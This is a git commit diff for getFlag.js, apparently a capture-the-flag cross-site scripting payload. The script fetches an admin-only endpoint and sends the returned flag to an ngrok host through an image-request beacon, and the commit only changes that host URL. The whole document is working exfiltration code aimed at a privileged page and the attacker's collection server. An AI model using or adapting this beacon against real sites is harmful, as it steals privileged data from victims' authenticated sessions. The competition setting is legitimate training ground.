fe6771400d03de95ce7a5442b78bb20e22cbc8e4
glno815 <78334532+glno815@users.noreply.github.com>
2026-03-17 21:46:57 +0700

    Update getFlag.js

--- getFlag.js
+++ getFlag.js
@@ -1,5 +1,5 @@
 fetch("/admin/retrieve-flag-2-new")
 .then(r=>r.text())
 .then(f=>{
-new Image().src="https://7368-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app/?flag="+encodeURIComponent(f)
+new Image().src="https://b5be-2402-800-61c7-539d-6be1-5c24-9cd9-8309.ngrok-free.app?flag="+encodeURIComponent(f)
 })
